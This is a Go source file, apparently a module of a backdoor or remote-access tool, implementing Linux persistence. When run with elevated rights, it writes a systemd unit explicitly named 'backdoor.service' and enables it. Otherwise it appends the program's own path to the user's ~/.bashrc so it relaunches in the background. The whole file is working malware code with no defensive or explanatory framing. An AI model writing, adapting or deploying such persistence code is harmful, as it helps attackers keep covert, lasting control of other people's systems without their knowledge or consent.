package persistence

import (
    "fmt"
    "os"
    "os/exec"
    "strings"
)

type LinuxPersistence struct{}

func (l *LinuxPersistence) Setup() error {
    exePath, err := os.Executable()
    if err != nil {
        return err
    }

    if IsElevated() {
        service := fmt.Sprintf(`[Unit]
Description=Backdoor

[Service]
ExecStart=%s

[Install]
WantedBy=multi-user.target`, exePath)

        path := "/etc/systemd/system/backdoor.service"
        err := os.WriteFile(path, []byte(service), 0644)
        if err != nil {
            return err
        }

        return exec.Command("systemctl", "enable", "--now", "backdoor.service").Run()
    }

    return appendIfNotExists(os.Getenv("HOME")+"/.bashrc", fmt.Sprintf("\n%s &\n", exePath))
}

func appendIfNotExists(path string, content string) error {
    data, _ := os.ReadFile(path)
    if strings.Contains(string(data), content) {
        return nil
    }
    f, err := os.OpenFile(path, os.O_APPEND|os.O_WRONLY, 0644)
    if err != nil {
        return err
    }
    defer f.Close()
    _, err = f.WriteString(content)
    return err
}
